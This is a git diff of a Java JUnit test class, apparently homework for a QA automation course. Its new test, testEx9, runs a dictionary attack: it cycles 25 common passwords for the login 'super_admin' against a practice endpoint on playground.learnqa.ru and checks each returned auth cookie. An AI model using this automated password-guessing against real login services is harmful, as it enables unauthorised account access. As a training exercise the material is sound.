@@ -7,6 +7,7 @@ import org.junit.jupiter.params.ParameterizedTest;
 import org.junit.jupiter.params.provider.CsvSource;
 
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
@@ -156,7 +157,45 @@ public class HelloWorldTests {
         String responseDevice = response.getString("device");
 
         assertEquals(platform, responsePlatform, ("User Agent= " + userAgent + "с неправильным " + "platform=" + responsePlatform));
-        assertEquals(browser, responseBrowser, ("User Agent= " +  userAgent + "с неправильным " + "browser= "  + responseBrowser));
+        assertEquals(browser, responseBrowser, ("User Agent= " + userAgent + "с неправильным " + "browser= " + responseBrowser));
         assertEquals(device, responseDevice, ("User Agent= " + userAgent + "с неправильным " + "device = " + responseDevice));
+    }
+
+    @Test
+    void testEx9() {
+        String[] passwords = {"123456", "123456789", "qwerty", "password", "1234567",
+                "12345678", "12345", "iloveyou", "111111", "123123",
+                "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop",
+                "654321", "555555", "lovely", "7777777", "welcome", "888888",
+                "princess", "dragon", "password1", "123qwe"};
+
+        for (String pass : passwords) {
+            Map<String, String> params = new HashMap<>();
+            params.put("login", "super_admin");
+            params.put("password", pass);
+            Response getSecretPass = RestAssured
+                    .given()
+                    .body(params)
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+            String cookie = getSecretPass.getCookie("auth_cookie");
+
+            Map<String, String> cookies = new HashMap<>();
+            cookies.put("auth_cookie", cookie);
+
+            Response checkCookie = RestAssured
+                    .given()
+                    .body(params)
+                    .cookies(cookies)
+                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+            String answer = checkCookie.asString();
+
+            if (!answer.equals("You are NOT authorized")) {
+                System.out.println(answer);
+                System.out.println(pass);
+                break;
+            }
+        }
     }
 }
